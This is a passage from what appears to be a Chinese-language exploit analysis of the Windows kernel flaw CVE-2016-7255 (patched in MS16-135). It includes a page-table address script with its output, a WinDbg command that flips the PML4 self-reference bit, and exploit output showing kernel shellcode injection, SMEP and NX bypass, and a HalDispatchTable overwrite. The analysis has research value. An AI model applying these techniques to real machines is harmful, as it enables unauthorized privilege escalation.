    print "PT:tt%s" % (hex(pt))
使用示例：
    ./pagetables.py 0x0 0x1ed
    Virtual Address: 0x0
    Self reference index: 0x1ed
    Page Tables
    Self Ref:     0xfffff6fb7dbedf68L
    Pml4:         0xfffff6fb7dbed000L
    Pdpt:         0xfffff6fb7da00000L
    Pd:           0xfffff6fb40000000L
    Pt:           0xfffff68000000000L
    ./pagetables.py 0xfffff68000000000 0x1ed
    Virtual Address: 0xfffff68000000000L
    Self reference index: 0x1ed
    Page Tables
    Self Ref:     0xfffff6fb7dbedf68L
    Pml4:         0xfffff6fb7dbedf68L
    Pdpt:         0xfffff6fb7dbed000L
    Pd:           0xfffff6fb7da00000L
    Pt:           0xfffff6fb40000000L
!pte in Windows 10 1607
在Windows 10 build 1607（周年版）中，windbg还不了解随机化pml4自引用地址
通过使用上面的python脚本，可以看出windbg没有考虑随机化的pml4自参考索引
    ./pagetables.py 0x00007ff6dd800000
    Virtual Address: 0x7ff6dd800000
    Self reference index: 0x1ed
    Page Tables
    Self Ref:     0xfffff6fb7dbedf68L
    Pml4:         0xfffff6fb7dbed7f8L
    Pdpt:         0xfffff6fb7daffed8L
    Pd:           0xfffff6fb5ffdb760L
    PT:           0xfffff6bffb6ec000L
如上所述，漏洞（CVE-2016-7255）允许我们使用0x4对值进行异或。这可以启用对PML4e自引用地址的用户模式访问，所以在用户空间可以访问页表，这反过来允许我们读取和修改内存中的任何数据。
注意在Before部分中，第2位设置为零，由KW-V中的“K“或”kenrel”表示。在运行漏洞Exp后，以地址0xFFFFF6FB7DBEDF68为目标，值0x30FED863被翻转为0x30FED867，使得能够在用户模式访问，由UW-V中的“U“或”user”表示。
Windows 8.1
之前
之后
要在windbg中复制exploit正在进行的操作，可以使用以下命令：
    r $t1 = FFFFF6FB7DBEDF68; eq $t1 poi($t1) |0x4
创建新PT来进行读写
现在，该条目已被改为允许用户模式访问，Enrique Nissim提出了一个方法：创建新的使用物理地址和属性进行更新的页表，从而实现读、写任意内存地址。
在这个例子中，地址0xffffffffffd00510只能从内核模式访问，这是由每个条目的第0x63（位7-0：“01100011”，注意第2个位为0）决定的。通过使用Enrique的代码，我们可以创建一个页表，来从用户模式“0x67”（位7-0：“01100111”，通知位2现在是1）访问，并指向与内核只有内存：0x1163或在这种情况下为0x1000（记住清零位11-0）。
之前
之后
漏洞Exp的输出
这是来自在Windows 7上运行的Exp的输出。
创建一个页表，允许读取haldispatchtable+0x8的值。
创建一个页表，允许将shellcode写入内核态内存，绕过SMEP和SMAP，并删除页表上的NX位以允许代码执行。
创建一个页表，允许覆盖haldispatchtable+0x8，这将触发代码执行。
读取将被替换的原始值（haldispatchtable+0x8）
On a Windows 7 box:
    [*] Getting Overwrite pointer: fffff80002c42c60
    [+] Selected spurious PML4E: fffff6fb7dbedf00
    [+] Spurious PT: fffff6fb7dbe0000
    --------------------------------------------------    [+] Content pml4e fffff6fb7dbedf80: 199063
    [+] Patching the Spurious Offset (PML4e) fffff6fb7dbedf00: 199067
    [+] Content pdpte fffff6fb7dbf0000: 198063
    [+] Patching the Spurious Offset (PDPTE) fffff6fb7dbedf00: 198067
    [+] Content pdpe fffff6fb7e0000b0: 1dc063
    [+] Patching the Spurious Offset (PDE) fffff6fb7dbedf00: 1dc067
    [+] Content pte fffff6fc00016210: 8000000002c42963
    [+] Patching the Spurious Offset (PTE) fffff6fb7dbedf00: 2c42967
    OverwriteAddress: fffff6fb7dbe0c60
写入shellcode和删除NX位的输出：
    Original OverwriteTarget pointer: fffff80002a438e8
    [+] Selected spurious PML4E: fffff6fb7dbedf08
    [+] Spurious PT: fffff6fb7dbe1000
    --------------------------------------------------    [+] Content pml4e fffff6fb7dbedff8: 1ec063
    [+] Patching the Spurious Offset (PML4e) fffff6fb7dbedf08: 1ec067
    [+] Content pdpte fffff6fb7dbffff8: 1eb063
    [+] Patching the Spurious Offset (PDPTE) fffff6fb7dbedf08: 1eb067
    [+] Content pdpe fffff6fb7ffffff0: 1ea063
    [+] Patching the Spurious Offset (PDE) fffff6fb7dbedf08: 1ea067
    [+] Content pte fffff6ffffffe800: 100163
    *** Patching the original location to enable NX...
    [+] Patching the Spurious Offset (PTE) fffff6fb7dbedf08: 100167 
    HAL address: fffff6fb7dbe1000
    [+] w00t: Shellcode stored at: ffffffffffd00d50
覆盖exec目标的输出：
    [+] Selected spurious PML4E: fffff6fb7dbedf10
    [+] Spurious PT: fffff6fb7dbe2000
    --------------------------------------------------    [+] Content pml4e fffff6fb7dbedf80: 199063
    [+] Patching the Spurious Offset (PML4e) fffff6fb7dbedf10: 199067
    [+] Content pdpte fffff6fb7dbf0000: 198063
    [+] Patching the Spurious Offset (PDPTE) fffff6fb7dbedf10: 198067
    [+] Content pdpe fffff6fb7e0000b0: 1dc063
    [+] Patching the Spurious Offset (PDE) fffff6fb7dbedf10: 1dc067
    [+] Content pte fffff6fc00016210: 8000000002c42963
    [+] Patching the Spurious Offset (PTE) fffff6fb7dbedf10: 2c42967
    Patch OverwriteTarget: fffff6fb7dbe2c68 with ffffffffffd00d50
**MS16-135**
Microsoft于2016年11月8日发布了补丁MS16-135，以解决此漏洞。 McAfee有一个篇很好的文章讲述了如何修复此漏洞。
**开发示范**
Windows 7 SP1 Workstation
Windows 8.1 Workstation
Windows 10 Build 1511 Workstation
Windows 2012 R2 Server